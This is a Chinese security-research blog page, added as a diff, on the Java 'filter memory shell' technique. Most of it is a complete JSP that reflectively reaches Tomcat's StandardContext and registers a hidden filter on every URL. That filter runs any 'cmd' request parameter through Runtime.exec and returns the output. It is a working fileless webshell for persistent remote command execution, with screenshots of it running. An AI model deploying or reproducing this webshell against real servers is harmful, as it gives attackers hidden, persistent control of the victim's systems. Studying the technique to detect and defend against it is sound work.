@@ -1,0 +1,227 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>filter内存马 | 1ux4ry Archive</title><meta name=description content="Java 内存马 作为一种无文件落地的木马，研究很有必要"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#前置步骤>前置步骤</a></li><li><a href=#完整代码>完整代码</a></li><li><a href=#运行示例>运行示例</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=filter内存马><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA内存马基础系列</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java内存马基础系列</span>
+<span class=article-hero-card__title-sub>filter内存马</span></div><p class=article-hero-card__meta>Java内存马 / Java内存马基础系列 / 1ux4ry Archive</p><p class=article-hero-card__desc>Java 内存马 作为一种无文件落地的木马，研究很有必要</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java内存马基础系列</p><h1>filter内存马</h1><div class=single-meta><span>2026-06-15</span>
+<span>Java内存马</span>
+<span># 安全研究</span></div></header><div class="page-copy content-body"><h1 id=前置步骤>前置步骤</h1><ul><li>获取<code>StandardContext</code>；</li><li>继承并编写一个恶意<code>filter</code>；</li><li>实例化一个<code>FilterDef</code>类，包装<code>filter</code>并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个<code>FilterMap</code>类，将我们的<code>Filter</code>和<code>urlpattern</code>相对应，使用<code>addFilterMapBefore</code>存放到<code>StandardContext.filterMaps</code>中；</li><li>通过反射获取<code>filterConfigs</code>，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到<code>filterConfig</code>中。</li></ul><h1 id=完整代码>完整代码</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.lang.reflect.*&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.catalina.core.StandardContext&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.util.Map&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.catalina.Context&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.io.*&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.util.Scanner&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.util.List&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span><span class=err>@</span> <span class=n>page</span> <span class=n>import</span><span class=o>=</span><span class=s2>&#34;java.util.ArrayList&#34;</span> <span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ServletContext</span> <span class=n>servletContext</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>getSession</span><span class=p>()</span><span class=o>.</span><span class=n>getServletContext</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Field</span> <span class=n>appctx</span> <span class=o>=</span> <span class=n>servletContext</span><span class=o>.</span><span class=n>getClass</span><span class=p>()</span><span class=o>.</span><span class=n>getDeclaredField</span><span class=p>(</span><span class=s2>&#34;context&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>appctx</span><span class=o>.</span><span class=n>setAccessible</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ApplicationContext</span> <span class=n>applicationContext</span> <span class=o>=</span> <span class=p>(</span><span class=n>ApplicationContext</span><span class=p>)</span> <span class=n>appctx</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>servletContext</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Field</span> <span class=n>stdctx</span> <span class=o>=</span> <span class=n>applicationContext</span><span class=o>.</span><span class=n>getClass</span><span class=p>()</span><span class=o>.</span><span class=n>getDeclaredField</span><span class=p>(</span><span class=s2>&#34;context&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>stdctx</span><span class=o>.</span><span class=n>setAccessible</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>StandardContext</span> <span class=n>standardContext</span> <span class=o>=</span> <span class=p>(</span><span class=n>StandardContext</span><span class=p>)</span> <span class=n>stdctx</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>applicationContext</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Field</span> <span class=n>filterConfigsField</span> <span class=o>=</span> <span class=n>standardContext</span><span class=o>.</span><span class=n>getClass</span><span class=p>()</span><span class=o>.</span><span class=n>getDeclaredField</span><span class=p>(</span><span class=s2>&#34;filterConfigs&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>filterConfigsField</span><span class=o>.</span><span class=n>setAccessible</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span> <span class=n>filterConfigs</span> <span class=o>=</span> <span class=p>(</span><span class=n>Map</span><span class=p>)</span> <span class=n>filterConfigsField</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>standardContext</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>filterName</span> <span class=o>=</span> <span class=n>getRandomString</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>filterConfigs</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>filterName</span><span class=p>)</span> <span class=o>==</span> <span class=n>null</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>Filter</span> <span class=n>filter</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Filter</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=err>@</span><span class=n>Override</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>public</span> <span class=n>void</span> <span class=n>init</span><span class=p>(</span><span class=n>FilterConfig</span> <span class=n>filterConfig</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=err>@</span><span class=n>Override</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>public</span> <span class=n>void</span> <span class=n>destroy</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=err>@</span><span class=n>Override</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>public</span> <span class=n>void</span> <span class=n>doFilter</span><span class=p>(</span><span class=n>ServletRequest</span> <span class=n>servletRequest</span><span class=p>,</span> <span class=n>ServletResponse</span> <span class=n>servletResponse</span><span class=p>,</span> <span class=n>FilterChain</span> <span class=n>filterChain</span><span class=p>)</span> <span class=n>throws</span> <span class=n>IOException</span><span class=p>,</span> <span class=n>ServletException</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>HttpServletRequest</span> <span class=n>httpServletRequest</span> <span class=o>=</span> <span class=p>(</span><span class=n>HttpServletRequest</span><span class=p>)</span> <span class=n>servletRequest</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=ne>String</span> <span class=n>cmd</span> <span class=o>=</span> <span class=n>httpServletRequest</span><span class=o>.</span><span class=n>getParameter</span><span class=p>(</span><span class=s2>&#34;cmd&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>InputStream</span> <span class=ow>in</span> <span class=o>=</span> <span class=n>Runtime</span><span class=o>.</span><span class=n>getRuntime</span><span class=p>()</span><span class=o>.</span><span class=n>exec</span><span class=p>(</span><span class=s2>&#34;cmd /c &#34;</span> <span class=o>+</span> <span class=n>cmd</span><span class=p>)</span><span class=o>.</span><span class=n>getInputStream</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>Scanner</span> <span class=n>s</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Scanner</span><span class=p>(</span><span class=ow>in</span><span class=p>,</span> <span class=s2>&#34;GBK&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>useDelimiter</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>A&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=ne>String</span> <span class=n>output</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>hasNext</span><span class=p>()</span> <span class=err>?</span> <span class=n>s</span><span class=o>.</span><span class=n>next</span><span class=p>()</span> <span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>servletResponse</span><span class=o>.</span><span class=n>setCharacterEncoding</span><span class=p>(</span><span class=s2>&#34;GBK&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>PrintWriter</span> <span class=n>out</span> <span class=o>=</span> <span class=n>servletResponse</span><span class=o>.</span><span class=n>getWriter</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=n>output</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>out</span><span class=o>.</span><span class=n>flush</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>out</span><span class=o>.</span><span class=n>close</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>filterChain</span><span class=o>.</span><span class=n>doFilter</span><span class=p>(</span><span class=n>servletRequest</span><span class=p>,</span> <span class=n>servletResponse</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>FilterDef</span> <span class=n>filterDef</span> <span class=o>=</span> <span class=n>new</span> <span class=n>FilterDef</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterDef</span><span class=o>.</span><span class=n>setFilterName</span><span class=p>(</span><span class=n>filterName</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterDef</span><span class=o>.</span><span class=n>setFilterClass</span><span class=p>(</span><span class=n>filter</span><span class=o>.</span><span class=n>getClass</span><span class=p>()</span><span class=o>.</span><span class=n>getName</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterDef</span><span class=o>.</span><span class=n>setFilter</span><span class=p>(</span><span class=n>filter</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>standardContext</span><span class=o>.</span><span class=n>addFilterDef</span><span class=p>(</span><span class=n>filterDef</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>FilterMap</span> <span class=n>filterMap</span> <span class=o>=</span> <span class=n>new</span> <span class=n>FilterMap</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterMap</span><span class=o>.</span><span class=n>setFilterName</span><span class=p>(</span><span class=n>filterName</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterMap</span><span class=o>.</span><span class=n>addURLPattern</span><span class=p>(</span><span class=s2>&#34;/*&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterMap</span><span class=o>.</span><span class=n>setDispatcher</span><span class=p>(</span><span class=n>DispatcherType</span><span class=o>.</span><span class=n>REQUEST</span><span class=o>.</span><span class=n>name</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>standardContext</span><span class=o>.</span><span class=n>addFilterMapBefore</span><span class=p>(</span><span class=n>filterMap</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>Constructor</span> <span class=n>constructor</span> <span class=o>=</span> <span class=n>ApplicationFilterConfig</span><span class=o>.</span><span class=k>class</span><span class=o>.</span><span class=n>getDeclaredConstructor</span><span class=p>(</span><span class=n>Context</span><span class=o>.</span><span class=k>class</span><span class=p>,</span> <span class=n>FilterDef</span><span class=o>.</span><span class=k>class</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>constructor</span><span class=o>.</span><span class=n>setAccessible</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>ApplicationFilterConfig</span> <span class=n>applicationFilterConfig</span> <span class=o>=</span> <span class=p>(</span><span class=n>ApplicationFilterConfig</span><span class=p>)</span> <span class=n>constructor</span><span class=o>.</span><span class=n>newInstance</span><span class=p>(</span><span class=n>standardContext</span><span class=p>,</span> <span class=n>filterDef</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>filterConfigs</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>filterName</span><span class=p>,</span> <span class=n>applicationFilterConfig</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>print</span><span class=p>(</span><span class=s2>&#34;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &#34;</span> <span class=o>+</span> <span class=n>filterName</span> <span class=o>+</span> <span class=s2>&#34;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;&lt;table border=&#39;1&#39;&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>List</span><span class=o>&lt;</span><span class=ne>String</span><span class=p>[]</span><span class=o>&gt;</span> <span class=n>allUrlPatterns</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayList</span><span class=o>&lt;&gt;</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>Object</span> <span class=n>filterConfigObj</span> <span class=p>:</span> <span class=n>filterConfigs</span><span class=o>.</span><span class=n>values</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>filterConfigObj</span> <span class=n>instanceof</span> <span class=n>ApplicationFilterConfig</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>ApplicationFilterConfig</span> <span class=n>filterConfig</span> <span class=o>=</span> <span class=p>(</span><span class=n>ApplicationFilterConfig</span><span class=p>)</span> <span class=n>filterConfigObj</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=ne>String</span> <span class=n>filtername</span> <span class=o>=</span> <span class=n>filterConfig</span><span class=o>.</span><span class=n>getFilterName</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=n>FilterDef</span> <span class=n>filterdef</span> <span class=o>=</span> <span class=n>standardContext</span><span class=o>.</span><span class=n>findFilterDef</span><span class=p>(</span><span class=n>filtername</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>filterdef</span> <span class=o>!=</span> <span class=n>null</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>FilterMap</span><span class=p>[]</span> <span class=n>filterMaps</span> <span class=o>=</span> <span class=n>standardContext</span><span class=o>.</span><span class=n>findFilterMaps</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=p>(</span><span class=n>FilterMap</span> <span class=n>filtermap</span> <span class=p>:</span> <span class=n>filterMaps</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=n>filtermap</span><span class=o>.</span><span class=n>getFilterName</span><span class=p>()</span><span class=o>.</span><span class=n>equals</span><span class=p>(</span><span class=n>filtername</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                            <span class=ne>String</span><span class=p>[]</span> <span class=n>urlPatterns</span> <span class=o>=</span> <span class=n>filtermap</span><span class=o>.</span><span class=n>getURLPatterns</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                            <span class=n>allUrlPatterns</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>urlPatterns</span><span class=p>);</span> <span class=o>//</span> <span class=err>将当前迭代的</span><span class=n>urlPatterns添加到列表中</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                            <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;&lt;tr&gt;&lt;td&gt;&#34;</span> <span class=o>+</span> <span class=n>filtername</span> <span class=o>+</span> <span class=s2>&#34;&lt;/td&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                            <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;&lt;td&gt;&#34;</span> <span class=o>+</span> <span class=ne>String</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;, &#34;</span><span class=p>,</span> <span class=n>urlPatterns</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;&lt;/td&gt;&lt;/tr&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;&lt;/table&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>String</span><span class=p>[]</span> <span class=n>urlPatterns</span> <span class=p>:</span> <span class=n>allUrlPatterns</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=ne>String</span> <span class=n>pattern</span> <span class=p>:</span> <span class=n>urlPatterns</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>pattern</span><span class=o>.</span><span class=n>equals</span><span class=p>(</span><span class=s2>&#34;/*&#34;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>out</span><span class=o>.</span><span class=n>println</span><span class=p>(</span><span class=s2>&#34;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/servlet&#34;</span> <span class=o>+</span> <span class=n>pattern</span> <span class=o>+</span> <span class=s2>&#34;?cmd=ipconfig&lt;br&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>%&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>&lt;%!</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=ne>String</span> <span class=n>getRandomString</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>characters</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>StringBuilder</span> <span class=n>randomString</span> <span class=o>=</span> <span class=n>new</span> <span class=n>StringBuilder</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=ne>int</span> <span class=n>index</span> <span class=o>=</span> <span class=p>(</span><span class=ne>int</span><span class=p>)</span> <span class=p>(</span><span class=n>Math</span><span class=o>.</span><span class=n>random</span><span class=p>()</span> <span class=o>*</span> <span class=n>characters</span><span class=o>.</span><span class=n>length</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>randomString</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>characters</span><span class=o>.</span><span class=n>charAt</span><span class=p>(</span><span class=n>index</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>randomString</span><span class=o>.</span><span class=n>toString</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>%&gt;</span>
+</span></span></code></pre></div><h1 id=运行示例>运行示例</h1><p>可以看到已经拦截了但是没有打印出信息</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518105601042.png alt=image.png loading=lazy decoding=async></figure></p><p>我们直接执行命令 发现可以被执行了</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518105659453.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
